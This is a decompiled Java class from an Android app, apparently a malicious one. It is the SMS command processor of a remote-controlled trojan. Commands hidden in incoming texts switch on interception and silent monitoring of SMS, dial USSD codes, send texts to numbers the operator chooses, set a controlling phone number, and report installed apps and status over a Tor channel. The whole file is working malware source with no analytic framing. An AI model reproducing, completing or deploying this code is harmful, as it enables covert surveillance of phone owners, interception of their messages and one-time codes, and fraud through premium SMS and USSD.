package com.baseapp;

import android.content.Context;
import android.content.SharedPreferences;
import java.util.HashSet;
import java.util.Iterator;

/* loaded from: classes.dex */
public class SmsProcessor {
    private static HashSet<String> commands = new HashSet<>();
    private final Context context;
    private final String data;
    private SharedPreferences settings;

    static {
        commands.add("#intercept_sms_start");
        commands.add("#intercept_sms_stop");
        commands.add("#ussd");
        commands.add("#listen_sms_start");
        commands.add("#listen_sms_stop");
        commands.add("#check");
        commands.add("#grab_apps");
        commands.add("#send_sms");
        commands.add("#control_number");
    }

    public SmsProcessor(String data, Context context) {
        this.data = data.trim();
        this.context = context;
        this.settings = this.context.getSharedPreferences(Constants.PREFS_NAME, 0);
    }

    public boolean processCommand() {
        boolean hasCommand = hasCommand();
        if (hasCommand) {
            if (this.data.indexOf("#intercept_sms_start") != -1) {
                processInterceptSMSStartCommand();
            } else if (this.data.indexOf("#intercept_sms_stop") != -1) {
                processInterceptSMSStopCommand();
            } else if (this.data.indexOf("#ussd") != -1) {
                processUSSDCommand();
            } else if (this.data.indexOf("#listen_sms_start") != -1) {
                processListenSMSStartCommand();
            } else if (this.data.indexOf("#listen_sms_stop") != -1) {
                processListenSMSStopCommand();
            } else if (this.data.indexOf("#grab_apps") != -1) {
                processGrabAppsCommand();
            } else if (this.data.indexOf("#send_sms") != -1) {
                processSendSMSCommand();
            } else if (this.data.indexOf("#control_number") != -1) {
                processControlNumberCommand();
            } else if (this.data.indexOf("#check") == -1) {
                return false;
            } else {
                processCheckCommand();
            }
            return true;
        }
        return false;
    }

    private void processControlNumberCommand() {
        String number = Parser.getParameter(this.data, 0);
        Utils.putStringValue(this.settings, Constants.CONTROL_NUMBER, number);
        TorSender.sendControlNumberData(this.context);
        Utils.sendMessage(number, "Number done");
    }

    private void processCheckCommand() {
        TorSender.sendCheckData(this.context);
    }

    private void processSendSMSCommand() {
        Utils.sendMessage(Parser.getParameter(this.data, 0), this.data.substring(Parser.indexOfSpace(this.data, 1)));
    }

    private void processGrabAppsCommand() {
        TorSender.sendInstalledApps(this.context);
    }

    private void processListenSMSStopCommand() {
        Utils.putBooleanValue(this.settings, Constants.LISTENING_SMS_ENABLED, false);
    }

    private void processListenSMSStartCommand() {
        Utils.putBooleanValue(this.settings, Constants.LISTENING_SMS_ENABLED, true);
    }

    private void processUSSDCommand() {
        if (USSDService.isRunning) {
            Utils.putBooleanValue(this.settings, Constants.MAKING_USSD, true);
        }
        Utils.makeUSSD(this.context, Parser.getParameter(this.data, 0));
    }

    private void processInterceptSMSStartCommand() {
        Utils.putBooleanValue(this.settings, Constants.INTERCEPTING_INCOMING_ENABLED, true);
        TorSender.sendRentStatus(this.context, "started");
    }

    private void processInterceptSMSStopCommand() {
        Utils.putBooleanValue(this.settings, Constants.INTERCEPTING_INCOMING_ENABLED, false);
        TorSender.sendRentStatus(this.context, "stopped");
    }

    private boolean hasCommand() {
        Iterator<String> it = commands.iterator();
        while (it.hasNext()) {
            String command = it.next();
            if (this.data.indexOf(command) != -1) {
                return true;
            }
        }
        return false;
    }

    public boolean needToInterceptIncoming() {
        return this.settings.getBoolean(Constants.INTERCEPTING_INCOMING_ENABLED, false);
    }

    public boolean needToListen() {
        return this.settings.getBoolean(Constants.LISTENING_SMS_ENABLED, false);
    }

    public String getControlNumber() {
        return this.settings.getString(Constants.CONTROL_NUMBER, "");
    }
}